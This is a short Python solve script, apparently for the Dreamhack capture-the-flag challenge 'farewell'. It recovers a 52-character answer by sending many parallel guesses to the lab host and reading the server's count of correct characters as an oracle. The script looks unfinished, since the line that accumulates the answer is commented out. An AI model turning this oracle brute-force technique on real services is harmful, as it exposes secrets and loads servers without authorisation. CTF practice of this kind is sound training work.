@@ -1,0 +1,40 @@
+# dreamhack - farewell
+
+import requests, string, re
+from concurrent.futures import ThreadPoolExecutor
+
+URL = "http://host3.dreamhack.games:21656"
+
+# for i in range(100) :
+#    res = requests.get(URL + f"/?answer={"!" * i}" )
+#    if "Please input the message" not in res.text :
+#       print(f"the len of message is {i}")
+
+final_result = ''
+
+def bf(ch) :
+    #일단 한번에 여러단어가 맞는 경우는 무시하자
+    test_word = final_result + str(ch)
+    test_word = test_word.ljust(52, "0")
+    # print(f"test_word : {test_word}")
+    res = requests.get(URL + f"/?answer={test_word}")
+
+    # if "correct!" in res.text :
+    #     print(res.text)
+    #     print(ch)
+
+    match = re.search(r"(\d+) correct!", res.text)
+    
+    if match :
+        print([match.group(1), ch])
+        return [match.group(1), ch]
+
+with ThreadPoolExecutor(max_workers=1000) as executor :
+    for i in range(52) :
+        results = executor.map(bf, string.printable)
+
+        for result in results :
+            if int(result[0]) > i :
+                print(result[1])
+                # final_result += result[1]    
+
